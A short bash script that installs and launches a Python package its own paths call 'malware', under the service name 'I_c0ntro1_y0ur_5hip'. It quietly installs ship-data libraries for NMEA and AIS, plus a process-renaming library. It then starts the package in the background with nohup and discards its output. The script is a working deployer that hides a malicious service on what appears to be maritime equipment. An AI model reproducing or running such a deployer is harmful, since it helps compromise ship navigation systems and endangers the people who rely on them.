#!/bin/bash

set -e

SERVICE_NAME="I_c0ntro1_y0ur_5hip"
INSTALL_DIR="/opt/$SERVICE_NAME"
BIN_PATH="/usr/local/bin/$SERVICE_NAME"

# Step 1: Copy code to installation directory
sudo mkdir -p "$INSTALL_DIR/malware"
sudo cp -r malware/* "$INSTALL_DIR/malware"

# Step 2: Create virtual environment
sudo python3 -m venv "$INSTALL_DIR/venv"

# Step 3: Install dependencies silently
sudo "$INSTALL_DIR/venv/bin/pip" install --quiet --no-cache-dir aiohttp~=3.8 pynmea2~=1.18 pyais~=2.4 setproctitle

# Step 4: Create launch script
sudo tee "$BIN_PATH" > /dev/null <<EOF
#!/bin/bash
cd "$INSTALL_DIR"
nohup ./venv/bin/python -m malware > /dev/null 2>&1 &
EOF

sudo chmod +x "$BIN_PATH"

# Step 5: Launch the script in the background with nohup
# Output will go to /opt/I_c0ntro1_y0ur_5hip/nohup.out
nohup "$BIN_PATH" > "$INSTALL_DIR/nohup.out" 2>&1 &
